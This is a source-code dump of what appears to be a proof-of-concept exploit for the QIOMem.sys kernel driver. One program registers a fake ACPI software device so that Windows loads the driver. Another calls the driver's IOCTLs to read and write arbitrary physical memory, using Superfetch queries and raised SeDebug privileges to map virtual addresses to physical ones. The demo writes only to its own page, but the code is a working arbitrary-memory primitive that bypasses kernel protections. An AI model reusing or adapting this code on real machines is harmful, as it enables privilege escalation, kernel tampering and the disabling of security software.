@@ -1,0 +1,684 @@
+Project Path: arc_gmh5225_qiomem_ug81qrw2
+
+Source Tree:
+
+```txt
+arc_gmh5225_qiomem_ug81qrw2
+├── QIOMem.sys
+├── acpi.cpp
+├── build.bat
+├── main.cpp
+└── superfetch
+    ├── nt.h
+    └── superfetch.h
+
+```
+
+`acpi.cpp`:
+
+```cpp
+#include <stdio.h>
+#include <swdevice.h>
+#include <windows.h>
+
+#pragma comment(lib, "swdevice.lib")
+
+#define TARGET_HWID L"ACPI\\QCI0701"
+
+static HANDLE g_hCreateDone = nullptr;
+
+void WINAPI DeviceCreateCallback(
+    HSWDEVICE hSwDevice,
+    HRESULT hrCreateResult,
+    PVOID pContext,
+    PCWSTR pszDeviceInstanceId)
+{
+    if (SUCCEEDED(hrCreateResult))
+        printf("[+] Virtual device created: %ws\n", pszDeviceInstanceId);
+    else
+        printf("[-] Device creation failed: 0x%08X\n", hrCreateResult);
+
+    SetEvent(g_hCreateDone);
+}
+
+int main()
+{
+    g_hCreateDone = CreateEvent(nullptr, FALSE, FALSE, nullptr);
+
+    const wchar_t hwIds[] = TARGET_HWID L"\0";
+
+    SW_DEVICE_CREATE_INFO createInfo {};
+    createInfo.cbSize = sizeof(createInfo);
+    createInfo.pszInstanceId = L"FakeACPIDevice0001";
+    createInfo.pszzHardwareIds = hwIds;
+    createInfo.CapabilityFlags = SWDeviceCapabilitiesNone;
+    createInfo.pszDeviceDescription = L"Virtual ACPI Device";
+
+    HSWDEVICE hSwDevice = nullptr;
+
+    HRESULT hr = SwDeviceCreate(
+        L"MyVirtualBus",
+        L"HTREE\\ROOT\\0",
+        &createInfo,
+        0,
+        nullptr,
+        DeviceCreateCallback,
+        nullptr,
+        &hSwDevice);
+
+    if (FAILED(hr)) {
+        printf("[-] SwDeviceCreate failed: 0x%08X\n", hr);
+        return 1;
+    }
+
+    WaitForSingleObject(g_hCreateDone, 10000);
+
+    printf("[*] Device node alive — PnP should now load the driver.\n");
+    printf("[*] Press Enter to remove the device and exit...\n");
+    getchar();
+
+    SwDeviceClose(hSwDevice);
+    CloseHandle(g_hCreateDone);
+    return 0;
+}
+```
+
+`build.bat`:
+
+```bat
+@echo off
+cl /std:c++latest main.cpp
+cl /std:c++latest acpi.cpp
+```
+
+`main.cpp`:
+
+```cpp
+#include "superfetch/superfetch.h"
+#include <Psapi.h>
+#include <SetupAPI.h>
+#include <Windows.h>
+#include <cstdint>
+#include <memoryapi.h>
+#include <print>
+#include <vector>
+#include <winnt.h>
+
+#pragma comment(lib, "ntdll.lib")
+#pragma comment(lib, "setupapi.lib")
+
+static const GUID GUID_QIOMEM_INTERFACE = {
+    0x020C37D0, 0xA3A6, 0x4069,
+    { 0xA6, 0x40, 0x33, 0x48, 0x0A, 0x03, 0x3C, 0x25 }
+};
+
+#define IOCTL_PHYS_READ_DWORD 0x8012008
+#define IOCTL_PHYS_WRITE_DWORD 0x8012014
+
+#pragma pack(push, 1)
+struct PhysIoBuffer { // Total: 11 bytes
+    uint32_t Address; // [0..3]  Physical address (32-bit)
+    char padding[3]; // [4..6]  Padding
+    uint32_t Data32; // [7..10] Dword-granularity value (buf+7)
+};
+static_assert(sizeof(PhysIoBuffer) == 11);
+#pragma pack(pop)
+
+static HANDLE OpenDevice()
+{
+    HDEVINFO hDevInfo = SetupDiGetClassDevs(
+        &GUID_QIOMEM_INTERFACE,
+        nullptr, nullptr,
+        DIGCF_PRESENT | DIGCF_DEVICEINTERFACE);
+
+    if (hDevInfo == INVALID_HANDLE_VALUE) {
+        printf("[-] SetupDiGetClassDevs failed: %lu\n", GetLastError());
+        return INVALID_HANDLE_VALUE;
+    }
+
+    SP_DEVICE_INTERFACE_DATA ifaceData = {};
+    ifaceData.cbSize = sizeof(ifaceData);
+
+    if (!SetupDiEnumDeviceInterfaces(hDevInfo, nullptr,
+            &GUID_QIOMEM_INTERFACE, 0, &ifaceData)) {
+        printf("[-] No device interface found: %lu\n", GetLastError());
+        SetupDiDestroyDeviceInfoList(hDevInfo);
+        return INVALID_HANDLE_VALUE;
+    }
+
+    DWORD requiredSize = 0;
+    SetupDiGetDeviceInterfaceDetailW(hDevInfo, &ifaceData,
+        nullptr, 0, &requiredSize, nullptr);
+
+    auto* detail = (SP_DEVICE_INTERFACE_DETAIL_DATA_W*)malloc(requiredSize);
+    if (!detail) {
+        SetupDiDestroyDeviceInfoList(hDevInfo);
+        return INVALID_HANDLE_VALUE;
+    }
+    detail->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_W);
+
+    SetupDiGetDeviceInterfaceDetailW(hDevInfo, &ifaceData,
+        detail, requiredSize, nullptr, nullptr);
+    printf("[*] Opening: %ws\n", detail->DevicePath);
+
+    HANDLE h = CreateFileW(detail->DevicePath,
+        GENERIC_READ | GENERIC_WRITE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        nullptr, OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL, nullptr);
+
+    free(detail);
+    SetupDiDestroyDeviceInfoList(hDevInfo);
+    return h;
+}
+
+static bool read_phys_dword(HANDLE hDev, uint64_t phys_addr, uint32_t& out)
+{
+    PhysIoBuffer buf {};
+    buf.Address = static_cast<uint32_t>(phys_addr);
+    DWORD bytes_ret = 0;
+    if (!DeviceIoControl(hDev, IOCTL_PHYS_READ_DWORD,
+            &buf, sizeof(buf),
+            &buf, sizeof(buf),
+            &bytes_ret, nullptr))
+        return false;
+    out = buf.Data32;
+    return true;
+}
+
+static bool read_phys_qword(HANDLE hDev, uint64_t phys_addr, uint64_t& out)
+{
+    uint32_t lo = 0, hi = 0;
+    if (!read_phys_dword(hDev, phys_addr, lo))
+        return false;
+    if (!read_phys_dword(hDev, phys_addr + 4, hi))
+        return false;
+    out = (static_cast<uint64_t>(hi) << 32) | lo;
+    return true;
+}
+
+static bool write_phys_dword(HANDLE hDev, uint64_t phys_addr, uint32_t val)
+{
+    PhysIoBuffer buf {};
+    buf.Address = static_cast<uint32_t>(phys_addr);
+    buf.Data32 = val;
+    DWORD bytes_ret = 0;
+    return DeviceIoControl(hDev, IOCTL_PHYS_WRITE_DWORD,
+               &buf, sizeof(buf),
+               &buf, sizeof(buf),
+               &bytes_ret, nullptr)
+        != 0;
+}
+
+static bool write_phys_qword(HANDLE hDev, uint64_t phys_addr, uint64_t val)
+{
+    uint32_t lo = static_cast<uint32_t>(val);
+    uint32_t hi = static_cast<uint32_t>(val >> 32);
+    if (!write_phys_dword(hDev, phys_addr, lo))
+        return false;
+    if (!write_phys_dword(hDev, phys_addr + 4, hi))
+        return false;
+    return true;
+}
+
+int main()
+{
+    HANDLE hDev = OpenDevice();
+    if (hDev == INVALID_HANDLE_VALUE) {
+        std::println("[-] OpenDevice failed: {}", GetLastError());
+        return 1;
+    }
+
+    constexpr size_t PAGE_SZ = 0x1000;
+    constexpr int MAX_ATTEMPTS = 64;
+
+    void* buf = nullptr;
+    uint64_t pa = 0;
+    std::vector<void*> rejects;
+
+    for (int attempt = 0; attempt < MAX_ATTEMPTS; ++attempt) {
+        buf = VirtualAlloc(nullptr, PAGE_SZ, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!buf) {
+            std::println("[-] VirtualAlloc failed: {}", GetLastError());
+            break;
+        }
+
+        memset(buf, 0, PAGE_SZ);
+
+        if (!VirtualLock(buf, PAGE_SZ)) {
+            std::println("[-] VirtualLock failed: {}", GetLastError());
+            VirtualFree(buf, 0, MEM_RELEASE);
+            buf = nullptr;
+            continue;
+        }
+
+        auto const mm = spf::memory_map::current();
+        if (!mm) {
+            std::println("[-] Could not retrieve memory map!");
+            VirtualUnlock(buf, PAGE_SZ);
+            VirtualFree(buf, 0, MEM_RELEASE);
+            buf = nullptr;
+            break;
+        }
+
+        pa = mm->translate(buf);
+        if (!pa) {
+            std::println("[!] attempt {}: translate failed for VA {:#X}", attempt, reinterpret_cast<uintptr_t>(buf));
+            VirtualUnlock(buf, PAGE_SZ);
+            VirtualFree(buf, 0, MEM_RELEASE);
+            buf = nullptr;
+            continue;
+        }
+
+        if (pa < 0x1'0000'0000ULL) {
+            std::println("[+] attempt {}: VA {:#X} -> PA {:#X} (below 4GB)", attempt, reinterpret_cast<uintptr_t>(buf), pa);
+            break; // success
+        }
+
+        std::println("[!] attempt {}: PA {:#X} above 4GB, retrying...", attempt, pa);
+        // Keep this page locked so OS doesn't give us the same physical page again
+        rejects.push_back(buf);
+        buf = nullptr;
+        pa = 0;
+    }
+
+    // Free all the rejected pages
+    for (void* r : rejects) {
+        VirtualUnlock(r, PAGE_SZ);
+        VirtualFree(r, 0, MEM_RELEASE);
+    }
+
+    if (!buf || !pa) {
+        std::println("[-] Failed to get a page below 4GB after {} attempts", MAX_ATTEMPTS);
+        return 1;
+    }
+    std::println("[+] VA {:#X} -> PA {:#X}", reinterpret_cast<uintptr_t>(buf), pa);
+
+    *reinterpret_cast<uint64_t*>(buf) = 0xAAAAAAAAAAAA;
+
+    // Read back via physical memory to verify
+    uint64_t readback = 0;
+    if (read_phys_qword(hDev, pa, readback)) {
+        std::println("[+] phys read:  {:016X}", readback);
+    } else {
+        std::println("[-] phys read failed");
+    }
+
+    // Write a new value via physical memory
+    uint64_t new_val = 0x1337C0DE00C0FFEE;
+    if (write_phys_qword(hDev, pa, new_val)) {
+        std::println("[+] phys write: {:016X}", new_val);
+    } else {
+        std::println("[-] phys write failed");
+    }
+
+    // Verify it landed in the virtual mapping
+    uint64_t check = *reinterpret_cast<uint64_t*>(buf);
+    std::println("[+] VA read:    {:016X} {}", check, check == new_val ? "OK" : "MISMATCH");
+
+    VirtualUnlock(buf, PAGE_SZ);
+    VirtualFree(buf, 0, MEM_RELEASE);
+    CloseHandle(hDev);
+    return 0;
+}
+```
+
+`superfetch/nt.h`:
+
+```h
+#pragma once
+
+#include <Windows.h>
+#include <winternl.h>
+
+namespace spf {
+
+enum SUPERFETCH_INFORMATION_CLASS {
+  SuperfetchRetrieveTrace         = 1,  // Query
+  SuperfetchSystemParameters      = 2,  // Query
+  SuperfetchLogEvent              = 3,  // Set
+  SuperfetchGenerateTrace         = 4,  // Set
+  SuperfetchPrefetch              = 5,  // Set
+  SuperfetchPfnQuery              = 6,  // Query
+  SuperfetchPfnSetPriority        = 7,  // Set
+  SuperfetchPrivSourceQuery       = 8,  // Query
+  SuperfetchSequenceNumberQuery   = 9,  // Query
+  SuperfetchScenarioPhase         = 10, // Set
+  SuperfetchWorkerPriority        = 11, // Set
+  SuperfetchScenarioQuery         = 12, // Query
+  SuperfetchScenarioPrefetch      = 13, // Set
+  SuperfetchRobustnessControl     = 14, // Set
+  SuperfetchTimeControl           = 15, // Set
+  SuperfetchMemoryListQuery       = 16, // Query
+  SuperfetchMemoryRangesQuery     = 17, // Query
+  SuperfetchTracingControl        = 18, // Set
+  SuperfetchTrimWhileAgingControl = 19,
+  SuperfetchInformationMax        = 20
+};
+
+struct SUPERFETCH_INFORMATION {
+  ULONG                        Version = 45;
+  ULONG                        Magic   = 'kuhC';
+  SUPERFETCH_INFORMATION_CLASS InfoClass;
+  PVOID                        Data;
+  ULONG                        Length;
+};
+
+struct MEMORY_FRAME_INFORMATION {
+  ULONGLONG UseDescription  : 4;
+  ULONGLONG ListDescription : 3;
+  ULONGLONG Reserved0       : 1;
+  ULONGLONG Pinned          : 1;
+  ULONGLONG DontUse         : 48;
+  ULONGLONG Priority        : 3;
+  ULONGLONG Reserved        : 4;
+};
+
+struct FILEOFFSET_INFORMATION {
+  ULONGLONG DontUse  : 9;
+  ULONGLONG Offset   : 48;
+  ULONGLONG Reserved : 7;
+};
+
+struct PAGEDIR_INFORMATION {
+  ULONGLONG DontUse           : 9;
+  ULONGLONG PageDirectoryBase : 48;
+  ULONGLONG Reserved          : 7;
+};
+
+struct UNIQUE_PROCESS_INFORMATION {
+  ULONGLONG DontUse          : 9;
+  ULONGLONG UniqueProcessKey : 48;
+  ULONGLONG Reserved         : 7;
+};
+
+struct MMPFN_IDENTITY {
+  union {
+    MEMORY_FRAME_INFORMATION   e1;
+    FILEOFFSET_INFORMATION     e2;
+    PAGEDIR_INFORMATION        e3;
+    UNIQUE_PROCESS_INFORMATION e4;
+  } u1;
+  SIZE_T PageFrameIndex;
+  union {
+    struct {
+      ULONG Image    : 1;
+      ULONG Mismatch : 1;
+    } e1;
+    PVOID FileObject;
+    PVOID UniqueFileObjectKey;
+    PVOID ProtoPteAddress;
+    PVOID VirtualAddress;
+  } u2;
+};
+
+struct SYSTEM_MEMORY_LIST_INFORMATION {
+  SIZE_T    ZeroPageCount;
+  SIZE_T    FreePageCount;
+  SIZE_T    ModifiedPageCount;
+  SIZE_T    ModifiedNoWritePageCount;
+  SIZE_T    BadPageCount;
+  SIZE_T    PageCountByPriority[8];
+  SIZE_T    RepurposedPagesByPriority[8];
+  ULONG_PTR ModifiedPageCountPageFile;
+};
+
+struct PF_PFN_PRIO_REQUEST {
+  ULONG                          Version;
+  ULONG                          RequestFlags;
+  SIZE_T                         PfnCount;
+  SYSTEM_MEMORY_LIST_INFORMATION MemInfo;
+  MMPFN_IDENTITY                 PageData[ANYSIZE_ARRAY];
+};
+
+struct PF_PHYSICAL_MEMORY_RANGE {
+  ULONG_PTR BasePfn;
+  ULONG_PTR PageCount;
+};
+
+struct PF_MEMORY_RANGE_INFO_V1 {
+  ULONG Version = 1;
+  ULONG RangeCount;
+  PF_PHYSICAL_MEMORY_RANGE Ranges[ANYSIZE_ARRAY];
+};
+
+struct PF_MEMORY_RANGE_INFO_V2 {
+  ULONG Version = 2;
+  ULONG Flags;
+  ULONG RangeCount;
+  PF_PHYSICAL_MEMORY_RANGE Ranges[ANYSIZE_ARRAY];
+};
+
+inline constexpr ULONG SE_PROF_SINGLE_PROCESS_PRIVILEGE = 13;
+inline constexpr ULONG SE_DEBUG_PRIVILEGE               = 20;
+
+inline constexpr SYSTEM_INFORMATION_CLASS SystemSuperfetchInformation = SYSTEM_INFORMATION_CLASS(79);
+
+extern "C" NTSYSAPI NTSTATUS RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+
+} // namespace spf
+
+```
+
+`superfetch/superfetch.h`:
+
+```h
+#pragma once
+
+#include "nt.h"
+
+#include <vector>
+#include <unordered_map>
+#include <expected>
+#include <memory>
+
+namespace spf {
+
+struct memory_range {
+  std::uint64_t pfn = 0;
+  std::size_t page_count = 0;
+};
+
+enum class spf_error {
+  raise_privilege,
+  query_ranges,
+  query_pfn
+};
+
+using memory_ranges = std::vector<memory_range>;
+using memory_translations = std::unordered_map<void const*, std::uint64_t>;
+
+class memory_map {
+public:
+  // Create a snapshot of the current system memory map.
+  static std::expected<memory_map, spf_error> current();
+
+  // Translate a virtual address to a physical address.
+  std::uint64_t translate(void const* address) const;
+
+  // Get a vector of physical memory ranges.
+  memory_ranges const& ranges() const;
+
+  // Get a map of virtual to physical page translations.
+  memory_translations const& translations() const;
+
+private:
+  static bool raise_privilege();
+
+  static memory_ranges query_memory_ranges();
+  static memory_ranges query_memory_ranges_v1();
+  static memory_ranges query_memory_ranges_v2();
+
+  static NTSTATUS query_superfetch_info(
+    SUPERFETCH_INFORMATION_CLASS info_class,
+    PVOID                        buffer,
+    ULONG                        length,
+    PULONG                       return_length = nullptr
+  );
+
+private:
+  // Contiguous physical memory ranges.
+  memory_ranges ranges_ = {};
+
+  // Virtual to physical page translations.
+  memory_translations translations_ = {};
+};
+
+// Take a snapshot of the current system memory map.
+inline std::expected<memory_map, spf_error> memory_map::current() {
+  if (!raise_privilege())
+    return std::unexpected(spf_error::raise_privilege);
+
+  memory_map mm = {};
+  mm.ranges_ = query_memory_ranges();
+
+  if (mm.ranges_.empty())
+    return std::unexpected(spf_error::query_ranges);
+
+  for (auto const& [base_pfn, page_count] : mm.ranges_) {
+    // This is a bit too big, but its not a big deal.
+    std::size_t const buffer_length = sizeof(PF_PFN_PRIO_REQUEST) +
+      sizeof(MMPFN_IDENTITY) * page_count;
+
+    auto const buffer = std::make_unique<std::uint8_t[]>(buffer_length);
+    auto const request = reinterpret_cast<PF_PFN_PRIO_REQUEST*>(buffer.get());
+    request->Version      = 1;
+    request->RequestFlags = 1;
+    request->PfnCount     = page_count;
+
+    for (std::uint64_t i = 0; i < page_count; ++i)
+      request->PageData[i].PageFrameIndex = base_pfn + i;
+
+    if (!NT_SUCCESS(query_superfetch_info(
+        SuperfetchPfnQuery, request, buffer_length)))
+      return std::unexpected(spf_error::query_pfn);
+
+    for (std::uint64_t i = 0; i < page_count; ++i) {
+      // Cache the translation for this page.
+      if (void const* const virt = request->PageData[i].u2.VirtualAddress)
+        mm.translations_[virt] = (base_pfn + i) << 12;
+    }
+  }
+
+  return mm;
+}
+
+// Translate a virtual address to a physical address.
+inline std::uint64_t memory_map::translate(void const* const address) const {
+  // Align to the lowest page boundary.
+  void const* const aligned = reinterpret_cast<void const*>(
+    reinterpret_cast<std::uint64_t>(address) & ~0xFFFull);
+
+  auto const it = translations_.find(aligned);
+  if (it == end(translations_))
+    return 0;
+
+  return it->second + (reinterpret_cast<std::uint64_t>(address) & 0xFFF);
+}
+
+// Get a vector of physical memory ranges.
+inline memory_ranges const& memory_map::ranges() const {
+  return ranges_;
+}
+
+// Get a map of virtual to physical page translations.
+inline memory_translations const& memory_map::translations() const {
+  return translations_;
+}
+
+inline bool memory_map::raise_privilege() {
+  BOOLEAN old = FALSE;
+
+  if (!NT_SUCCESS(RtlAdjustPrivilege(
+      SE_PROF_SINGLE_PROCESS_PRIVILEGE, TRUE, FALSE, &old)))
+    return false;
+
+  if (!NT_SUCCESS(RtlAdjustPrivilege(
+      SE_DEBUG_PRIVILEGE, TRUE, FALSE, &old)))
+    return false;
+
+  return true;
+}
+
+inline memory_ranges memory_map::query_memory_ranges() {
+  auto ranges = query_memory_ranges_v1();
+  if (ranges.empty())
+    return query_memory_ranges_v2();
+  return ranges;
+}
+
+inline memory_ranges memory_map::query_memory_ranges_v1() {
+  ULONG buffer_length = 0;
+
+  // STATUS_BUFFER_TOO_SMALL.
+  if (PF_MEMORY_RANGE_INFO_V1 info = {}; 0xC0000023 != query_superfetch_info(
+      SuperfetchMemoryRangesQuery, &info, sizeof(info), &buffer_length))
+    return {};
+
+  auto const buffer = std::make_unique<std::uint8_t[]>(buffer_length);
+  auto const info = reinterpret_cast<PF_MEMORY_RANGE_INFO_V1*>(buffer.get());
+  info->Version = 1;
+
+  if (!NT_SUCCESS(query_superfetch_info(
+      SuperfetchMemoryRangesQuery, info, buffer_length)))
+    return {};
+
+  memory_ranges ranges = {};
+
+  for (std::uint32_t i = 0; i < info->RangeCount; ++i) {
+    ranges.push_back({
+      .pfn = info->Ranges[i].BasePfn,
+      .page_count = info->Ranges[i].PageCount
+    });
+  }
+
+  return ranges;
+}
+
+inline memory_ranges memory_map::query_memory_ranges_v2() {
+  ULONG buffer_length = 0;
+
+  // STATUS_BUFFER_TOO_SMALL.
+  if (PF_MEMORY_RANGE_INFO_V2 info = {}; 0xC0000023 != query_superfetch_info(
+      SuperfetchMemoryRangesQuery, &info, sizeof(info), &buffer_length))
+    return {};
+
+  auto const buffer = std::make_unique<std::uint8_t[]>(buffer_length);
+  auto const info = reinterpret_cast<PF_MEMORY_RANGE_INFO_V2*>(buffer.get());
+  info->Version = 2;
+
+  if (!NT_SUCCESS(query_superfetch_info(
+      SuperfetchMemoryRangesQuery, info, buffer_length)))
+    return {};
+
+  memory_ranges ranges = {};
+
+  for (std::uint32_t i = 0; i < info->RangeCount; ++i) {
+    ranges.push_back({
+      .pfn = info->Ranges[i].BasePfn,
+      .page_count = info->Ranges[i].PageCount
+    });
+  }
+
+  return ranges;
+}
+
+inline NTSTATUS memory_map::query_superfetch_info(
+  SUPERFETCH_INFORMATION_CLASS info_class,
+  PVOID                        buffer,
+  ULONG                        length,
+  PULONG                       return_length
+) {
+  SUPERFETCH_INFORMATION superfetch_info = {
+    .InfoClass = info_class,
+    .Data      = buffer,
+    .Length    = length
+  };
+
+  return NtQuerySystemInformation(SystemSuperfetchInformation,
+    &superfetch_info, sizeof(superfetch_info), return_length);
+}
+
+} // spf
+
+```
